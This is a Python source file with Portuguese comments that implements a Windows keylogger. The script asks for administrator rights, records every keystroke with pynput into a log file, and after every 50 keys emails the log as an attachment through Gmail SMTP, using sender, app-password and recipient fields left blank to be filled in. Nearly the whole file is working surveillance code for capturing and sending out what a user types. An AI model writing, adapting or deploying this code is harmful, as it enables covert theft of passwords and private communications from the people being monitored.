import os
import sys
import ctypes
import smtplib
from email.message import EmailMessage
from pynput.keyboard import Key, Listener

def esta_como_administrador():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# Eleva o privilégio mantendo o mesmo executável (útil para venv)
if not esta_como_administrador():
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        f'"{os.path.abspath(sys.argv[0])}"',
        None,
        1
    )
    sys.exit()

print("Programa iniciado como administrador")

# CONFIGURAÇÃO DIRETA (Insira seus dados aqui)
REMETENTE = ""
SENHA_APP = ""  # Sua senha de app de 16 dígitos do Google
DESTINO = ""

count = 0
keys = []

def enviar_email():
    if not os.path.exists("log.txt"):
        return

    msg = EmailMessage()
    msg["Subject"] = "Log de teclas"
    msg["From"] = ""
    msg["To"] = ""
    msg.set_content("Segue log atualizado em anexo.")
    
    try:
        with open("log.txt", "rb") as f:
            msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="log.txt")
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login("", "")
            smtp.send_message(msg)
        print("Email enviado com sucesso!")
    except Exception as e:
        print(f"Erro ao enviar email: {e}")

def write_file(chaves):
    with open("log.txt", "a", encoding="utf-8") as f:
        for key in chaves:
            try:
                f.write(key.char)
            except AttributeError:
                if key == Key.space:
                    f.write(" ")
                elif key == Key.enter:
                    f.write("\n")
                else:
                    f.write(f"[{key.name}]")

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print(f"{key} pressionado")

    if count >= 50:
        write_file(keys)
        enviar_email()
        keys = []
        count = 0

def on_release(key):
    if key == Key.esc: 
        return False

# Inicia o listener de teclado
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
